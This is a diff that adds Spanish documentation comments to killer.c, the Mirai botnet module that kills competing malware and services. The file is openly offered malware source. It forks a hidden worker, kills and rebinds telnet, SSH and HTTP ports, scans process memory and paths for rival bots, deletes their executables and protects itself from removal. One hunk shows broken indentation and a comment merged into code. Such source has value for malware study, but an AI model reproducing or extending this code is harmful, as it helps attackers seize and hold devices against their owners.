@@ -1,40 +1,81 @@
-#define _GNU_SOURCE
+/**
+ * @file killer.c
+ * @brief Módulo del bot Mirai encargado de eliminar procesos competidores y servicios no deseados
+ *
+ * Este módulo implementa funcionalidades para:
+ * - Detectar y eliminar otros bots maliciosos
+ * - Deshabilitar servicios comunes como telnet, SSH y HTTP
+ * - Escanear la memoria de procesos en busca de patrones maliciosos
+ * - Proteger el bot contra la eliminación
+ */
+
+#define _GNU_SOURCE  // Habilita características GNU extendidas
 
 #ifdef DEBUG
-#include <stdio.h>
+#include <stdio.h>  // Inclusión condicional para funciones de depuración
 #endif
-#include <unistd.h>
-#include <stdlib.h>
-#include <arpa/inet.h>
-#include <linux/limits.h>
-#include <sys/types.h>
-#include <dirent.h>
-#include <signal.h>
-#include <fcntl.h>
-#include <time.h>
+#include <unistd.h>     // Para fork(), getpid(), etc.
+#include <stdlib.h>     // Para malloc(), atoi()
+#include <arpa/inet.h>  // Para funciones de red
+#include <linux/limits.h> // Para PATH_MAX
+#include <sys/types.h>  // Para tipos de sistema
+#include <dirent.h>     // Para manipulación de directorios
+#include <signal.h>     // Para kill()
+#include <fcntl.h>      // Para open()
+#include <time.h>       // Para time()
 
-#include "includes.h"
-#include "killer.h"
-#include "table.h"
-#include "util.h"
+#include "includes.h"   // Definiciones comunes del bot
+#include "killer.h"     // Prototipos del killer
+#include "table.h"      // Funciones de tabla de cadenas
+#include "util.h"       // Utilidades comunes
 
+/**
+ * @var killer_pid
+ * @brief PID del proceso killer hijo
+ */
 int killer_pid;
+
+/**
+ * @var killer_realpath
+ * @brief Ruta real del ejecutable del killer
+ */
 char *killer_realpath;
+
+/**
+ * @var killer_realpath_len
+ * @brief Longitud de la ruta real del ejecutable
+ */
 int killer_realpath_len = 0;
 
+/**
+ * @brief Inicializa y ejecuta el proceso killer del bot
+ * 
+ * Esta función realiza las siguientes tareas:
+ * 1. Se bifurca en un proceso hijo dedicado
+ * 2. Mata y previene el reinicio de servicios comunes (telnet, SSH, HTTP)
+ * 3. Escanea continuamente procesos en busca de otros malware
+ * 4. Protege al bot contra intentos de eliminación
+ * 
+ * El proceso killer se ejecuta en segundo plano y monitorea constantemente
+ * el sistema en busca de amenazas potenciales.
+ */
 void killer_init(void)
 {
+    // Variables de control para el escaneo de procesos
     int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
     uint32_t scan_counter = 0;
-    struct sockaddr_in tmp_bind_addr;
+    struct sockaddr_in tmp_bind_addr;  // Estructura para vincular puertos
 
-    // Let parent continue on main thread
+    // Bifurca el proceso para ejecutar el killer en segundo plano
+    // El proceso padre continúa con la ejecución principal
     killer_pid = fork();
-    if (killer_pid > 0 || killer_pid == -1)
+    if (killer_pid > 0 || killer_pid == -1)  // Si es el padre o hubo error
         return;
 
-    tmp_bind_addr.sin_family = AF_INET;
-    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
+    // Configura la estructura de dirección para vincular puertos
+    // Esto se usa para prevenir que otros servicios se reinicien
+    tmp_bind_addr.sin_family = AF_INET;  // Familia de direcciones IPv4
+    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;  // Escucha en todas las interfaces
 
     // Kill telnet service and prevent it from restarting
 #ifdef KILLER_REBIND_TELNET
@@ -103,13 +144,17 @@ void killer_init(void)
 #endif
 #endif
 
-    // In case the binary is getting deleted, we want to get the REAL realpath
+    // Espera un momento antes de obtener la ruta real del ejecutable
+    // Esto es necesario en caso de que el binario esté siendo eliminado
+    // o movido durante la inicialización
     sleep(5);
 
-    killer_realpath = malloc(PATH_MAX);
-    killer_realpath[0] = 0;
-    killer_realpath_len = 0;
+    // Aloca memoria para almacenar la ruta real del ejecutable
+    killer_realpath = malloc(PATH_MAX);  // PATH_MAX es la longitud máxima de ruta en el sistema
+    killer_realpath[0] = 0;              // Inicializa como cadena vacía
+    killer_realpath_len = 0;             // Inicializa la longitud como 0
 
+    // Verifica si podemos acceder al ejecutable a través de /proc/self/exe
     if (!has_exe_access())
     {
 #ifdef DEBUG
@@ -121,10 +166,15 @@ void killer_init(void)
     printf("[killer] Memory scanning processes\n");
 #endif
 
+    // Bucle principal del killer
+    // Escanea continuamente todos los procesos del sistema en busca de:
+    // - Otros bots maliciosos
+    // - Procesos que intenten eliminar nuestro ejecutable
+    // - Procesos con patrones de memoria sospechosos
     while (TRUE)
     {
-        DIR *dir;
-        struct dirent *file;
+        DIR *dir;             // Directorio /proc para enumerar procesos
+        struct dirent *file;  // Entrada de directorio actual
 
         table_unlock_val(TABLE_KILLER_PROC);
         if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
@@ -146,23 +196,28 @@ void killer_init(void)
             char status_path[64], *ptr_status_path = status_path;
             int rp_len, fd, pid = atoi(file->d_name);
 
-            scan_counter++;
+            scan_counter++;  // Incrementa el contador de procesos escaneados
+            
+            // Verifica si ya hemos escaneado este PID
             if (pid <= killer_highest_pid)
             {
-                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
+                // Si ha pasado más tiempo que KILLER_RESTART_SCAN_TIME, reinicia el escaneo
+                // Esto es necesario para detectar procesos que hayan aparecido en PIDs más bajos
+                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                 {
 #ifdef DEBUG
-                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
+                    printf("[killer] Han pasado %d segundos desde el último escaneo. ¡Re-escaneando todos los procesos!\n", KILLER_RESTART_SCAN_TIME);
 #endif
-                    killer_highest_pid = KILLER_MIN_PID;
+                    killer_highest_pid = KILLER_MIN_PID;  // Reinicia desde el PID mínimo
                 }
                 else
                 {
+                    // Duerme ocasionalmente para permitir que aparezcan nuevos procesos
                     if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
-                        sleep(1); // Sleep so we can wait for another process to spawn
+                        sleep(1);  // Espera 1 segundo cada 10 procesos escaneados
                 }
 
-                continue;
+                continue;  // Salta al siguiente proceso
             }
             if (pid > killer_highest_pid)
                 killer_highest_pid = pid;
@@ -171,15 +226,17 @@ void killer_init(void)
             table_unlock_val(TABLE_KILLER_PROC);
             table_unlock_val(TABLE_KILLER_EXE);
 
-            // Store /proc/$pid/exe into exe_path
-            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
-            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
-            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
+            // Construye la ruta al archivo ejecutable del proceso (/proc/[pid]/exe)
+            // Esta ruta es un enlace simbólico al ejecutable real del proceso
+            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));  // Agrega "/proc/"
+            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);                                 // Agrega el PID
+            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));   // Agrega "/exe"
 
-            // Store /proc/$pid/status into status_path
-            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
-            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
-            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));
+            // Construye la ruta al archivo de estado del proceso (/proc/[pid]/status)
+            // Este archivo contiene información sobre el estado del proceso
+            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));    // Agrega "/proc/"
+            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);                                   // Agrega el PID
+            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));  // Agrega "/status"
 
             table_lock_val(TABLE_KILLER_PROC);
             table_lock_val(TABLE_KILLER_EXE);
@@ -189,16 +246,15 @@ void killer_init(void)
             {
                 realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
 
-                table_unlock_val(TABLE_KILLER_ANIME);
-                // If path contains ".anime" kill.
-                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
-                {
-                    unlink(realpath);
-                    kill(pid, 9);
-                }
-                table_lock_val(TABLE_KILLER_ANIME);
-
-                // Skip this file if its realpath == killer_realpath
+            // Verifica si el proceso es otro bot conocido por su patrón en el nombre
+            table_unlock_val(TABLE_KILLER_ANIME);
+            // Si la ruta contiene el patrón ".anime", elimina el ejecutable y mata el proceso
+            if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
+            {
+                unlink(realpath);  // Elimina el ejecutable
+                kill(pid, 9);      // Mata el proceso con SIGKILL
+            }
+            table_lock_val(TABLE_KILLER_ANIME);                // Skip this file if its realpath == killer_realpath
                 if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                     continue;
 
@@ -245,11 +301,26 @@ void killer_init(void)
 #endif
 }
 
+/**
+ * @brief Termina el proceso killer
+ * 
+ * Envía una señal SIGKILL al proceso killer para terminarlo inmediatamente.
+ * Esta función se llama cuando el bot necesita finalizar limpiamente.
+ */
 void killer_kill(void)
 {
-    kill(killer_pid, 9);
+    kill(killer_pid, 9);  // Envía SIGKILL al proceso killer
 }
 
+/**
+ * @brief Mata procesos que estén usando un puerto específico
+ * 
+ * @param port Puerto a verificar en formato de red (big-endian)
+ * @return BOOL TRUE si se encontró y mató algún proceso, FALSE en caso contrario
+ * 
+ * Busca en /proc/net/tcp procesos que estén escuchando en el puerto especificado
+ * y los termina. Se usa principalmente para matar servicios como telnet o SSH.
+ */
 BOOL killer_kill_by_port(port_t port)
 {
     DIR *dir, *fd_dir;
@@ -284,16 +355,19 @@ BOOL killer_kill_by_port(port_t port)
     if (fd == -1)
         return 0;
 
+    // Lee línea por línea el archivo /proc/net/tcp
+    // Este archivo contiene información sobre todas las conexiones TCP
     while (util_fdgets(buffer, 512, fd) != NULL)
     {
-        int i = 0, ii = 0;
+        int i = 0, ii = 0;  // Índices para parsear la línea
 
+        // Busca el primer ':' que separa el número de entrada del resto
         while (buffer[i] != 0 && buffer[i] != ':')
             i++;
 
-        if (buffer[i] == 0) continue;
-        i += 2;
-        ii = i;
+        if (buffer[i] == 0) continue;  // Línea malformada, salta a la siguiente
+        i += 2;  // Salta el ':' y el espacio siguiente
+        ii = i;  // Guarda la posición de inicio de la dirección local
 
         while (buffer[i] != 0 && buffer[i] != ' ')
             i++;
@@ -302,25 +376,29 @@ BOOL killer_kill_by_port(port_t port)
         // Compare the entry in /proc/net/tcp to the hex value of the htons port
         if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
         {
-            int column_index = 0;
-            BOOL in_column = FALSE;
-            BOOL listening_state = FALSE;
+            // Analiza las columnas de la línea de /proc/net/tcp
+            // El formato es: sl  local_address rem_address  st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+            int column_index = 0;        // Índice de la columna actual
+            BOOL in_column = FALSE;      // Indica si estamos dentro de una columna
+            BOOL listening_state = FALSE; // Indica si el socket está en estado LISTEN
 
             while (column_index < 7 && buffer[++i] != 0)
             {
                 if (buffer[i] == ' ' || buffer[i] == '\t')
-                    in_column = TRUE;
+                    in_column = TRUE;  // Encontró un separador de columnas
                 else
                 {
                     if (in_column == TRUE)
-                        column_index++;
+                        column_index++;  // Nueva columna encontrada
 
+                    // Verifica si el socket está en estado LISTEN (0x0A)
+                    // La columna 4 (índice 1) contiene el estado del socket
                     if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                     {
                         listening_state = TRUE;
                     }
 
-                    in_column = FALSE;
+                    in_column = FALSE;  // Ya no estamos en un separador
                 }
             }
             ii = i;
@@ -418,6 +496,15 @@ BOOL killer_kill_by_port(port_t port)
     return ret;
 }
 
+/**
+ * @brief Verifica si el proceso tiene acceso a su propio ejecutable
+ * 
+ * @return BOOL TRUE si tiene acceso, FALSE en caso contrario
+ * 
+ * Verifica si el proceso puede acceder a su archivo ejecutable a través de
+ * /proc/[pid]/exe. También obtiene y almacena la ruta real del ejecutable
+ * para comparaciones posteriores.
+ */
 static BOOL has_exe_access(void)
 {
     char path[PATH_MAX], *ptr_path = path, tmp[16];
@@ -491,16 +578,28 @@ static BOOL status_upx_check(char *exe_path, char *status_path)
 }
 */
 
+/**
+ * @brief Escanea la memoria de un proceso en busca de patrones maliciosos
+ * 
+ * @param path Ruta al archivo de memoria del proceso (/proc/[pid]/mem)
+ * @return BOOL TRUE si se encontró algún patrón malicioso, FALSE en caso contrario
+ * 
+ * Busca patrones conocidos de otros malware (qbot, zollard, etc) en la
+ * memoria del proceso. Se usa para detectar y eliminar otros bots.
+ */
 static BOOL memory_scan_match(char *path)
 {
     int fd, ret;
-    char rdbuf[4096];
+    char rdbuf[4096];  // Buffer para lectura de memoria
+    // Punteros a los patrones de malware a buscar
     char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;
+    // Longitudes de los patrones respectivos
     int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;
-    BOOL found = FALSE;
+    BOOL found = FALSE;  // Indica si se encontró algún patrón malicioso
 
+    // Intenta abrir el archivo de memoria del proceso
     if ((fd = open(path, O_RDONLY)) == -1)
-        return FALSE;
+        return FALSE;  // Si no se puede abrir, no hay coincidencia
 
     table_unlock_val(TABLE_MEM_QBOT);
     table_unlock_val(TABLE_MEM_QBOT2);
@@ -538,9 +637,21 @@ static BOOL memory_scan_match(char *path)
     return found;
 }
 
+/**
+ * @brief Busca una subcadena en un buffer de memoria
+ * 
+ * @param buf Buffer donde buscar
+ * @param buf_len Longitud del buffer
+ * @param str Cadena a buscar
+ * @param str_len Longitud de la cadena
+ * @return BOOL TRUE si se encontró la cadena, FALSE en caso contrario
+ * 
+ * Implementa un algoritmo de búsqueda de subcadenas byte a byte. Se usa
+ * para encontrar patrones específicos en la memoria de los procesos.
+ */
 static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
 {
-    int matches = 0;
+    int matches = 0;  // Contador de coincidencias consecutivas
 
     if (str_len > buf_len)
         return FALSE;
